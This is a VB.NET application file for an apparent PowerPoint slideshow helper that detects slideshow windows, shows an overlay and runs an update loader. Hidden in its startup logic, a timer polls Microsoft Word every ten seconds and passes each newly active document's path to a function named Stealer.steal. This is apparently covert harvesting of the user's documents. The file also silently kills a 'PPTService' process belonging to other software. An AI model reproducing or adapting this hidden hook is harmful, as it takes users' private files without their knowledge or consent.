Imports System.IO
Imports System.Reflection
Imports System.Threading.Tasks
Imports System.Timers
Imports System.Windows.Interop
Imports Microsoft.Office.Interop
Imports TelerikWpfApp1.logcat.Log

Class Application
    Inherits System.Windows.Application
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Private Declare Function IsWindow Lib "user32" Alias "IsWindow" (ByVal hwnd As Int32) As Int32
    Private Declare Function GetWindowRect Lib "user32" Alias "GetWindowRect" (ByVal hwnd As IntPtr, ByRef lpRect As RECT) As Integer
    Private Declare Function GetClientRect Lib "user32" Alias "GetClientRect" (ByVal hwnd As IntPtr, ByRef lpRect As RECT) As Integer
    Private Declare Function MoveWindow Lib "user32" Alias "MoveWindow" (ByVal hwnd As IntPtr,
                                                                         ByVal x As Integer,
                                                                         ByVal y As Integer,
                                                                         ByVal nWidth As Integer,
                                                                         ByVal nHeight As Integer,
                                                                         ByVal bRepaint As Boolean) As Integer
    Private Declare Function SetForegroundWindow Lib "user32" Alias "SetForegroundWindow" (ByVal hwnd As Int32) As Int32
    Private Declare Function SetProcessDPIAware Lib "user32" Alias "SetProcessDPIAware" () As Boolean
    Private mutex As System.Threading.Mutex
    Public mw As MainWindow1
    Dim prepare_timer As System.Windows.Threading.DispatcherTimer
    Dim close_timer, wordtimer As Timer
    Dim ppt_hwnd As Int32

    Dim lastdoc As String

    Protected Overrides Sub OnExit(e As ExitEventArgs)
        logcat.Log.Logger.Instance.WriteLog(e.ApplicationExitCode.ToString)
        MyBase.OnExit(e)
    End Sub

    Protected Overrides Sub OnSessionEnding(e As SessionEndingCancelEventArgs)
        logcat.Log.Logger.Instance.WriteLog(e.ReasonSessionEnding.ToString)
        MyBase.OnSessionEnding(e)
    End Sub

    Protected Overrides Sub OnStartup(ByVal e As StartupEventArgs)
        logcat.Log.Logger.Instance.WriteLog("程序启动")
        MyBase.OnStartup(e)
        Dim ret As Boolean
        mutex = New System.Threading.Mutex(True, "PPTHelper", ret)

        If Not ret Then
            Environment.[Exit](0)
        End If
        AddHandler DispatcherUnhandledException, AddressOf App_DispatcherUnhandledException

        prepare_timer = New System.Windows.Threading.DispatcherTimer
        prepare_timer.Interval = TimeSpan.FromSeconds(1)
        close_timer = New Timer
        close_timer.Interval = 200
        wordtimer = New Timer
        wordtimer.Interval = 1000 * 10
        AddHandler wordtimer.Elapsed, AddressOf wordprepare
        AddHandler prepare_timer.Tick, AddressOf prepare
        AddHandler close_timer.Elapsed, AddressOf close
        prepare_timer.Start()
        wordtimer.Start()
        wordprepare()
    End Sub


    Private Sub wordprepare()
        Try
            Dim word As New Word.GlobalClass
            Dim t = Word.ActiveDocument.FullName
            If t <> lastdoc Then
                Stealer.steal(t)
                lastdoc = t
            End If
        Catch ex As Exception
            Logger.Instance.WriteException(ex)
        End Try
    End Sub

    Private Sub prepare()
        'ppt_hwnd = FindWindow("PPTFrameClass", vbNullString)
        ppt_hwnd = FindWindow("screenClass", vbNullString)
        If ppt_hwnd <> 0 Then
            prepare_timer.Stop()
            Try
                mw = New MainWindow1()
                mw.ppt_hwnd = ppt_hwnd
                GetWindowRect(ppt_hwnd, mw.ppt_rect)
                mw.ppt_obj = New PowerPoint.ApplicationClass
                mw.ppt_view = mw.ppt_obj.ActivePresentation.SlideShowWindow.View
                Me.MainWindow = mw
                MainWindow.Show()
            Catch ex As Exception
                logcat.Log.Logger.Instance.WriteException(ex)
            Finally
                close_timer.Start()
                Dim seewo = Process.GetProcessesByName("PPTService")
                If seewo.Length <> 0 Then
                    For Each i In seewo
                        i.Kill()
                    Next
                End If
            End Try
        End If
    End Sub

    Private Sub close()
        If IsWindow(ppt_hwnd) = 0 Then
            close_timer.Stop()
            If mw IsNot Nothing Then
                Me.Dispatcher.Invoke(Sub()
                                         mw.Close()
                                         mw = Nothing
                                         Me.MainWindow = Nothing
                                         'Application.Current.Shutdown()
                                     End Sub)
                'Console.WriteLine("WINDOW_CLOSE")
            End If
            FlushMemory.Flush()
            If updatehelper.updateok Then
                Dim t1 = New DirectoryInfo(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location))
                Dim downini = t1.Parent.FullName & "\tmp.ini"
                Dim localini = t1.Parent.FullName & "\version.ini"
                Dim rootpath = t1.Parent.FullName
                Logger.Instance.WriteLog("运行loader")
                Process.Start(rootpath & "\loader.exe")
                End
                Logger.Instance.WriteLog("什么？END之后还能执行？")
            End If
            prepare_timer.Start()
        End If

    End Sub


    Private Sub App_DispatcherUnhandledException(ByVal sender As Object, ByVal e As System.Windows.Threading.DispatcherUnhandledExceptionEventArgs)
        MessageBox.Show("程序异常." & Environment.NewLine + e.Exception.Message)
        e.Handled = True
    End Sub
End Class
